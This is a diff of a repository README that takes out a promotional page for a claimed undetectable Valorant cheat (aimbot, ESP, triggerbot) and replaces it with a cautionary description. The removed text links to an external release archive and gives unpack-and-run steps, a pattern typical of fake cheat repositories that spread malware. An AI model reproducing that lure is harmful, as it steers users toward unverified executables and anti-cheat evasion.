@@ -1,70 +1,18 @@
-# Valorant Cheat 2026 — Aim + ESP + Triggerbot
+# Valorant Scripts 2026
 
-This cheat for Valorant offers an absolute advantage with smooth aiming, enemy agent visibility, instant shooting capabilities, and guaranteed hits, ensuring victory in every round without detection.
+This repository contains a static web page and supporting assets. The repository name and page content refer to cheat-like software for Valorant. The project does not provide evidence that any download is safe, verified, or authorized by the game publisher.
 
-![downloads](https://img.shields.io/badge/downloads-15.6k-1f883d?logo=github)
-![version](https://img.shields.io/badge/version-4.2.8-1f883d?logo=github)
-![license](https://img.shields.io/badge/license-BSD--3--Clause-1f883d?logo=github)
-![Windows](https://img.shields.io/badge/Windows-compatible-1f883d?logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgMy40NDkgOS43NSAyLjF2OS40NTFIMG0xMC45NDktOS42MDJMMjQgMHYxMS40SDEwLjk0OU0wIDEyLjZoOS43NXY5LjQ1MUwwIDIwLjY5OU0xMC45NDkgMTIuNkgyNFYyNGwtMTIuOS0xLjgwMSIvPjwvc3ZnPg==)
-# [**DOWNLOAD RELEASE**](https://MilliInspector.github.io/Valorant-Scripts-Undetected-2026/)
+## Repository structure
 
-![screenshot](.github/willow.jpeg)
+- `index.html` defines the download page.
+- `css/styles.css` contains the page styles.
+- `css/github-favicon.svg` is the page favicon.
+- `js/config.js` contains the page text and release/download configuration. Review external URLs in this file before visiting them.
+- `js/app.js` contains the browser-side page behavior.
+- `css/src.cpp` contains a C++ source file; it is not part of the static page's documented build process.
 
-# Features
+## Safety and status
 
-- The Aimbot provides precise and fluid targeting for improved accuracy during gameplay.
-- ESP displays enemy agents, their positions, silhouettes, and health points, giving players essential information.
-- A Triggerbot enables instant shooting upon aiming at an enemy, enhancing reaction time.
-- Magic Bullet ensures guaranteed hits regardless of positioning, making every shot count.
-- Radar functionality allows players to track enemy movements on the map easily.
+The download and security claims shown by the page have not been independently verified. Do not treat a badge, status message, or external link as proof that a file is safe. Do not run downloaded files or use software that interferes with Valorant or bypasses its anti-cheat protections.
 
-# Download
-
-Get the latest release from the [download release](https://github.com/MilliInspector/Valorant-Scripts-Undetected-2026/releases/tag/fa4d4fc6).
-
-**Install on your PC:**
-1. Unpack the downloaded archive to a convenient directory
-2. Open `README.txt`
-3. Follow the installation instructions
-
-# Contributing
-
-Contributions, bug reports, and feature requests are welcome.
-
-## 1. Fork the repository
-
-Create your personal fork of the project.
-
-## 2. Create a feature branch
-
-```bash
-git checkout -b feature/your-feature-name
-```
-
-## 3. Follow the coding standards
-
-* Use C++.
-* Keep the change small and consistent with the existing code.
-
-## 4. Validate your changes
-
-```bash
-git ls-files | grep .cpp
-```
-
-## 5. Commit your changes
-
-```bash
-git add .
-git commit -m "feat: enhance Valorant cheat with advanced targeting and ESP features"
-```
-
-## 6. Push your branch
-
-```bash
-git push origin feature/your-feature-name
-```
-
-## 7. Open a Pull Request
-
-Describe what changed, why, and how it was tested.
+No automated build or test configuration is included in this repository. Documentation changes can be checked with `git diff --check`.
